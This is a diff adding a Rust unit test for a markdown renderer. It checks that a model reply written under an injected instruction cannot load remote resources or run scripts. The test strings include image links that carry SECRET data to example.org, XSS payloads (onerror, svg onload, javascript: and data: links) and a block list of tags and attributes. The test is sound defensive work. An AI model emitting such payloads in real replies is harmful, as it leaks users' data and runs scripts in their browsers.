@@ -205,6 +205,41 @@ mod tests {
     }
 
     #[test]
+    fn a_model_reply_cannot_load_a_resource_or_carry_a_script_or_a_data_link_through_the_renderer() {
+        // What a model writes after an injected instruction: an image whose address carries data, every element that
+        // loads something or runs something, and links that are not links. None of it may come out of the renderer.
+        let reply = [
+            "![x](https://example.org/a.png?d=SECRET)",
+            "![ref][r]\n\n[r]: https://example.org/b.png?d=SECRET",
+            "<img src=\"https://example.org/c.png?d=SECRET\" onerror=\"x()\">",
+            "<picture><source srcset=\"https://example.org/d.png\"><img src=\"https://example.org/e.png\"></picture>",
+            "<video src=\"https://example.org/v.mp4\" autoplay></video>",
+            "<audio src=\"https://example.org/a.mp3\"></audio>",
+            "<link rel=\"stylesheet\" href=\"https://example.org/s.css\">",
+            "<meta http-equiv=\"refresh\" content=\"0;url=https://example.org/\">",
+            "<base href=\"https://example.org/\">",
+            "<object data=\"https://example.org/o\"></object>",
+            "<embed src=\"https://example.org/e\">",
+            "<svg onload=\"alert(1)\"><image href=\"https://example.org/i.png\"/></svg>",
+            "<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>",
+            "<form action=\"https://example.org/post\"><input type=\"image\" src=\"https://example.org/f.png\"></form>",
+            "[plain](javascript:alert(1)) [entity](javascript&#58;alert(1)) [data](data:text/html;base64,PHNjcmlwdD4=)",
+            "<p style=\"background:url(https://example.org/bg.png)\">styled</p>",
+            "<https://example.org/?d=1>",
+        ]
+        .join("\n\n");
+        let html = render_markdown(&reply).unwrap();
+        for bad in [
+            "<img", "<picture", "<video", "<audio", "<source", "<link", "<meta", "<base", "<object", "<embed", "<svg", "<math",
+            "<form", "src=", "srcset", "action=", "style=", "onload", "onerror", "javascript:", "data:", "xlink",
+        ] {
+            assert!(!html.contains(bad), "{bad} survived: {html}");
+        }
+        // An autolink stays a link with its address: the page decides what to do with an address that carries data.
+        assert!(html.contains("<a href=\"https://example.org/?d=1\""), "{html}");
+    }
+
+    #[test]
     fn a_fenced_block_keeps_its_language_and_a_task_keeps_its_box() {
         let html = render_markdown("```rust\nfn main() {}\n```\n\n- [x] done\n- [ ] todo\n").unwrap();
         assert!(html.contains("class=\"language-rust\""), "{html}");
